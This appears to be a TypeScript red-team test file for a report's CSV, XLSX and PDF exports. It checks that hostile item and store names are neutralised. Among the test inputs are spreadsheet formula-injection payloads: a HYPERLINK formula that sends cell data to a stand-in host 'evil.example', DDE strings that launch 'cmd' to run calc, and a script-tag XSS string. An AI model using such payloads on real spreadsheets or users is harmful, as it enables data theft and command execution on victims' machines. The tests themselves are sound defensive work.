// Red-team: hostile names typed by execs at a live demo, pushed through the
// CSV / XLSX / PDF exports. Failing tests are the repro of a bug.
// Run: npx tsx --test "lib/**/redteam-*.test.ts"
import { test } from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";
import ExcelJS from "exceljs";
import { buildCsv } from "./csv";
import { buildWorkbook } from "./xlsx";
import { buildDocDefinition } from "./pdf";
import { col, Num, type ExportDoc } from "./doc";

type Row = { name: string; cents: number };

function docWith(rows: Row[], venue = "Demo Store"): ExportDoc {
  return {
    filenameBase: "items",
    reportTitle: "Items",
    venue,
    scopeLabel: "Store: Demo",
    rangeLabel: "Today",
    generatedLabel: "Generated 1 Oct 2026 09:00",
    locale: "en",
    sections: [
      {
        title: "Items",
        columns: [col.text<Row>("Item", (r) => r.name), col.money<Row>("Revenue", (r) => r.cents)],
        rows,
      },
    ],
  };
}

/** Parse our own CSV back into cells (RFC 4180, enough for these tests). */
function parseCsv(s: string): string[][] {
  const out: string[][] = [];
  let row: string[] = [];
  let cell = "";
  let q = false;
  for (let i = 0; i < s.length; i++) {
    const ch = s[i];
    if (q) {
      if (ch === '"' && s[i + 1] === '"') { cell += '"'; i++; }
      else if (ch === '"') q = false;
      else cell += ch;
    } else if (ch === '"') q = true;
    else if (ch === ",") { row.push(cell); cell = ""; }
    else if (ch === "\r" && s[i + 1] === "\n") { row.push(cell); out.push(row); row = []; cell = ""; i++; }
    else cell += ch;
  }
  return out;
}

const FORMULAS = [
  '=HYPERLINK("http://evil.example/?x="&A1,"Click for prize")',
  "+1+1",
  "-2+3+cmd|' /C calc'!A0",
  "@SUM(1+1)*cmd|' /C calc'!A0",
  "\t=1+1",
  "\r=1+1",
];

test("CSV: an item name that is a formula is neutralised (no = + - @ tab CR at the start of a text cell)", () => {
  const csv = buildCsv(docWith(FORMULAS.map((name) => ({ name, cents: 100 }))));
  const cells = parseCsv(csv).flat();
  const dangerous = cells.filter((c) => /^[=+\-@\t\r]/.test(c));
  assert.deepEqual(dangerous, [], "these cells would run as formulas when the CSV is opened in Excel/Sheets");
});

test("CSV: a store (venue) name that is a formula is neutralised in the header block", () => {
  const csv = buildCsv(docWith([], '=HYPERLINK("http://evil.example","Open")'));
  const first = parseCsv(csv)[0][0];
  assert.doesNotMatch(first, /^=/);
});

// --- held up -------------------------------------------------------------

test("CSV (held up): commas, quotes, newlines and CRLF in names round-trip intact", () => {
  const names = ['Fish, chips', 'The "Big" one', "two\nlines", "cr\r\nlf", "<script>alert(1)</script>", "🍺 ביר zalgo Z̴̡̛a̷l̸g̵o̶"];
  const csv = buildCsv(docWith(names.map((name, i) => ({ name, cents: i }))));
  const rows = parseCsv(csv);
  const got = rows.slice(rows.length - names.length).map((r) => r[0]);
  assert.deepEqual(got, names);
});

test("CSV (held up): money edges are plain decimals", () => {
  const csv = buildCsv(docWith([0, 9_999_999, -500, 1].map((cents) => ({ name: "x", cents }))));
  const rows = parseCsv(csv);
  assert.deepEqual(rows.slice(-4).map((r) => r[1]), ["0.00", "99999.99", "-5.00", "0.01"]);
});

test("XLSX (held up): a formula-looking name is stored as a string, not a formula", async () => {
  const wb = buildWorkbook(docWith(FORMULAS.map((name) => ({ name, cents: 100 }))), "Summary");
  const buf = await wb.xlsx.writeBuffer();
  const back = new ExcelJS.Workbook();
  await back.xlsx.load(buf as ArrayBuffer);
  const ws = back.worksheets[0];
  let formulas = 0;
  ws.eachRow((r) => r.eachCell((c) => { if (c.type === ExcelJS.ValueType.Formula) formulas++; }));
  assert.equal(formulas, 0);
});

test("XLSX (held up): control characters in a name do not corrupt the file", async () => {
  const wb = buildWorkbook(docWith([{ name: "bad\u0000\u0008\u001Fname", cents: 1 }]), "Summary");
  const buf = await wb.xlsx.writeBuffer();
  const back = new ExcelJS.Workbook();
  await back.xlsx.load(buf as ArrayBuffer); // throws on malformed XML
  assert.ok(back.worksheets.length >= 1);
});

// --- PDF ----------------------------------------------------------------

// Fallback fonts were weighed and rejected (see lib/export/pdf-text.ts: Noto
// CJK is ~16 MB, pdfmake can't shape Arabic/Hebrew or draw colour emoji), so
// the PDF swaps what Roboto can't draw for "\uFFFD" and says so. The finding
// "prints as blanks" is fixed when every drawn character has a real glyph.
test("PDF: emoji / Hebrew / Arabic / CJK names never print as blanks (shown as \uFFFD + a note)", () => {
  const req = createRequire(import.meta.url);
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const vfsMod = req("pdfmake/build/vfs_fonts.js");
  const vfs = vfsMod.pdfMake?.vfs ?? vfsMod.vfs ?? vfsMod;
  const fontkit = req("@foliojs-fork/fontkit");
  const font = fontkit.create(Buffer.from(vfs["Roboto-Regular.ttf"], "base64"));
  const names = ["beer emoji 🍺", "Hebrew ב", "Arabic ب", "CJK 啤", "👨‍👩‍👧‍👦🇨🇦 family", "Z̶̢̛a̸l̵g̷o", "Crème brûlée", "Пиво"];
  const def = buildDocDefinition(docWith(names.map((name) => ({ name, cents: 100 })), "Café 🍺"));
  const strings: string[] = [];
  const walk = (n: unknown): void => {
    if (typeof n === "string") strings.push(n);
    else if (Array.isArray(n)) n.forEach(walk);
    else if (n && typeof n === "object") for (const [k, v] of Object.entries(n)) if (k === "text" || typeof v === "object") walk(v);
  };
  walk(def.content);
  const blank = new Set<string>();
  for (const str of strings)
    for (const ch of str) if (ch !== "\n" && !font.hasGlyphForCodePoint(ch.codePointAt(0)!)) blank.add(`U+${ch.codePointAt(0)!.toString(16)}`);
  assert.deepEqual([...blank], [], "these characters would print as blanks / tofu in the PDF export");
  const json = JSON.stringify(def.content);
  for (const keep of ["Crème brûlée", "Пиво", "beer emoji \uFFFD", "CJK \uFFFD", "Café \uFFFD"]) assert.ok(json.includes(keep), keep);
  assert.match(json, /Excel and CSV exports keep every name/);
});

test("PDF (held up): a Latin-only report gets no replacement note", () => {
  const json = JSON.stringify(buildDocDefinition(docWith([{ name: "Crème brûlée — 2×", cents: 1 }])).content);
  assert.doesNotMatch(json, /\uFFFD|Excel and CSV exports keep/);
});

test("PDF (held up): text is passed as plain text nodes and money stays $1,234.56 in fr/de", () => {
  const d = docWith([{ name: "<b>x</b>", cents: 123456 }]);
  for (const locale of ["fr", "de", "es", "af"] as const) {
    const def = buildDocDefinition({ ...d, locale });
    const json = JSON.stringify(def.content);
    assert.match(json, /"\$1,234\.56"/, locale);
    assert.match(json, /"<b>x<\/b>"/, locale);
  }
});

test("fuel gallons export as numbers (XLSX number cell, CSV plain decimal, PDF 1,234.567 in every language)", async () => {
  const d: ExportDoc = {
    ...docWith([]),
    sections: [
      {
        title: "Fuel",
        columns: [col.num<{ milli: number }>("Gallons", (r) => r.milli / 1000, 3)],
        rows: [{ milli: 1234567 }],
        total: [Num(1234.567, 3)],
      },
    ],
  };
  const csv = parseCsv(buildCsv(d));
  assert.deepEqual(csv.slice(-2).map((r) => r[0]), ["1234.567", "1234.567"]);
  const back = new ExcelJS.Workbook();
  await back.xlsx.load((await buildWorkbook(d, "Summary").xlsx.writeBuffer()) as ArrayBuffer);
  let nums = 0;
  back.worksheets[0].eachRow((r) => r.eachCell((c) => { if (c.value === 1234.567) nums++; }));
  assert.ok(nums >= 1, "gallons were written as text");
  for (const locale of ["en", "fr", "de"] as const) {
    assert.match(JSON.stringify(buildDocDefinition({ ...d, locale }).content), /"1,234\.567"/, locale);
  }
});
